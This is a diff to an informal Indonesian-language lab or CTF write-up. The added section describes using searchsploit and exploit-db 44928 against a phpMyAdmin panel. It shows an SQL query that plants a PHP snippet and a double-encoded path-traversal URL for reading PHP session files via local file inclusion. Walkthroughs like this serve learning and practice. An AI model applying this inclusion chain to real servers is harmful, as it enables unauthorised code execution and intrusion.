@@ -178,7 +178,16 @@ gobuster vhost -u votenow.local --wordlist /usr/share/wordlists/dirbuster/direct
 
 lalu, setelah gw dpt langsung coba. eh masuknya malah ke *mercusuar* kan gblk. jadi gw kepikiran untuk save dulu ke `/etc/hosts` dan akhirnya gw bisa masuk ke panel `PhpMyAdmin`lalu gw masuk dan pas itu gw lansung plonga plongo kek orang idiot gitu, dan tiba" gw ngeliat ke versi dari panel *PhpMyAdmin* ini langsung gw cari pake `searchsploit` siapa tau ada exploitnya / semacamnya lah. dan yah...
 
+![img5](https://i.ibb.co/qRKkgbY/searchsploit.png)
+
 # Exploit
 ## Local File Inclusion
 
-
+menurut [exploit](https://www.exploit-db.com/exploits/44928)nya pertama tama gw harus masukin code yang dibawah ini ke SQL server-nya.
+```php
+select '<?php phpInfo();exit;?>'
+```
+terus katanya masukin juga payload buat baca session file gitu.
+```php
+http://1a23009a9c9e959d9c70932bb9f634eb.vsplate.me/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_(cookie session, kalo g tau letak cookie pake extension di browser namanya CookieEditor)
+```
